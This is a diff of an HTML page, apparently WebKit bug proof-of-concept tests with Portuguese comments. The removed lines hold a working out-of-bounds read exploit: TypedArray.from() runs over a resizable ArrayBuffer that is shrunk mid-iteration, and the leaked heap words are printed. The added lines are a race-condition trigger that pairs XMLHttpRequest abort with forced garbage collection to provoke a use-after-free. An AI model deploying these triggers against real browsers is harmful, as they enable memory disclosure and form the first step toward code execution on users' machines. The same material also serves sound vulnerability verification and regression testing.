@@ -1,108 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <title>WebKit Bug 312513 - OOB Read Test</title>
-    <style>
-        body {
-            font-family: monospace;
-            background-color: #111;
-            color: #eee;
-            padding: 20px;
-            font-size: 16px;
-            line-height: 1.4;
-        }
-        .pass { color: #4caf50; }
-        .fail { color: #f44336; }
-        .info { color: #2196f3; }
-        pre {
-            background-color: #222;
-            padding: 10px;
-            border-radius: 4px;
-            border: 1px solid #333;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-    </style>
-</head>
 <body>
-    <h2>WebKit Bug 312513 - TypedArray.from() OOB Read Verification</h2>
-    <div id="log"></div>
+<script>
 
-    <script>
-        const logDiv = document.getElementById('log');
+function gc() {
+    function gcRec(n) {
+          if (n < 1)
+              return {};
+          var temp = {i: "ab" + i + (i / 100000)};
+          temp += "foo";
+          gcRec(n-1);
+    }
+    for (var i = 0; i < 1000; i++)
+    gcRec(10);
+}
 
-        function print(msg, className = '') {
-            const el = document.createElement('div');
-            if (className) el.className = className;
-            el.textContent = msg;
-            logDiv.appendChild(el);
+
+// Estressa a race condition entre o GC thread e a thread principal
+function triggerRace() {
+    for (let i = 0; i < 2000; i++) {
+        let xhr = new XMLHttpRequest();
+        xhr.open("GET", "data:text/xml,<root><child/></root>", true);
+        
+        // Acessa o getter de upload e for�a parsing do document
+        let upload = xhr.upload;
+        xhr.responseType = "document";
+        xhr.send();
+
+        // For�a limpeza dos buffers / reset do estado na main thread
+        xhr.abort();
+
+        // Aloca objetos para for�ar o GC thread a disparar visitAdditionalChildren
+        if (i % 20 === 0 && window.GCController) {
+           gc();
         }
+    }
+}
 
-        function runTest() {
-            try {
-                if (typeof ArrayBuffer.prototype.resize !== 'function') {
-                    print("[- ] Resizable ArrayBuffer não é suportado neste ambiente.", "fail");
-                    return;
-                }
+try {
+    triggerRace();
+    document.body.innerText = "PASS: Sem crash por UAF durante GC concorrente.";
+} catch (e) {
+    document.body.innerText = "FAIL: " + e;
+}
 
-                const initialElements = 1024;
-                const bytesPerElement = 4;
-                const initialBytes = initialElements * bytesPerElement; // 4096 bytes
-                const shrinkElements = 4;
-                const shrinkBytes = shrinkElements * bytesPerElement;   // 16 bytes
-
-                const resizableBuffer = new ArrayBuffer(initialBytes, { maxByteLength: initialBytes * 4 });
-                const source = new Uint32Array(resizableBuffer);
-                source[Symbol.iterator] = null; // Força o TypedArray.from() a usar o caminho de indexação direta
-
-                // Preenche o buffer com um padrão de teste identificável
-                source.fill(0x41414141);
-
-                let callbackCount = 0;
-
-                print("[*] Iniciando TypedArray.from() e encolhendo o buffer no callback 0...", "info");
-
-                const result = Uint32Array.from(source, (val, index) => {
-                    if (index === 0) {
-                        // Reduz o buffer para apenas 4 elementos
-                        resizableBuffer.resize(shrinkBytes);
-                    }
-                    callbackCount++;
-                    return val;
-                });
-
-                print(`[*] Total de callbacks executados: ${callbackCount} (Esperado <= ${shrinkElements})`, "info");
-
-                if (callbackCount > shrinkElements) {
-                    print(`[+] VULNERÁVEL: O loop iterou ${callbackCount - shrinkElements} vezes fora dos limites!`, "fail");
-                    
-                    let leakedEntries = [];
-                    for (let i = shrinkElements; i < result.length; i++) {
-                        if (result[i] !== 0x41414141) {
-                            leakedEntries.push(`[+${i.toString().padStart(4, '0')}] 0x${result[i].toString(16).padStart(8, '0')}`);
-                        }
-                    }
-
-                    if (leakedEntries.length > 0) {
-                        print(`[+] Vazamento de memória detectado (${leakedEntries.length} palavras lidas da Heap):`, "fail");
-                        const pre = document.createElement('pre');
-                        pre.textContent = leakedEntries.slice(0, 30).join('\n') + (leakedEntries.length > 30 ? '\n... (truncado)' : '');
-                        logDiv.appendChild(pre);
-                    } else {
-                        print("[*] Leitura OOB ocorreu, mas os slots continham o padrão preenchido ou memória zerada.", "info");
-                    }
-                } else {
-                    print("[-] CORRIGIDO / NÃO VULNERÁVEL: A iteração foi interrompida nos limites.", "pass");
-                }
-
-            } catch (err) {
-                print(`[!] Erro durante o teste: ${err.message}`, "fail");
-            }
-        }
-
-        window.onload = runTest;
-    </script>
+</script>
 </body>
 </html>
-
